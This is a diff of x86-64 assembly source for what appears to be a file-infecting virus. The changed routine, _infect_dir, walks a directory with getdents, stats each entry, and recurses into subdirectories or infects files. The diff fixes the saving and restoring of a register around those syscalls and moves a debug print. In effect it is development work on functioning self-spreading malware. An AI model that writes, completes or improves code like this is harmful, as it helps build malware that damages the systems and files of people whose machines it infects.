@@ -96,9 +96,6 @@ _infect_dir:; (string rdi)
 	push rdx
 	push rcx
 
-	%ifdef DEBUG
-		call _print; _print(rdi)
-	%endif
 	push 2
 	pop rax; open
 	push 0o0200000; O_RDONLY | O_DIRECTORY
@@ -114,13 +111,16 @@ _infect_dir:; (string rdi)
 
 	sub rsp, 1024
 	.getdents:
-		mov rdi, r11
+		push r11
+		pop rdi
 		push 78
 		pop rax; getdents
 		push 1024
 		pop rdx; size of buffer
 		mov rsi, rsp; buffer
 		syscall
+		push rdi
+		pop r11
 		push rsi
 		pop r12
 		cmp rax, 0x0
@@ -173,6 +173,7 @@ _infect_dir:; (string rdi)
 			mov rdi, rsp
 
 		; check infect_dir or infect_file
+			push r11 ; stat using r11
 			sub rsp, 600
 
 			push 4
@@ -199,6 +200,7 @@ _infect_dir:; (string rdi)
 
 		.free_buffers:
 			add rsp, 600
+			pop r11 ; stat using r11
 			add rsp, 4096
 			pop rbx
 
@@ -221,6 +223,11 @@ _infect_dir:; (string rdi)
 
 	.return:
 		add rsp, 1024
+
+
+	%ifdef DEBUG
+		call _print; _print(rdi)
+	%endif
 
 		pop rcx
 		pop rdx
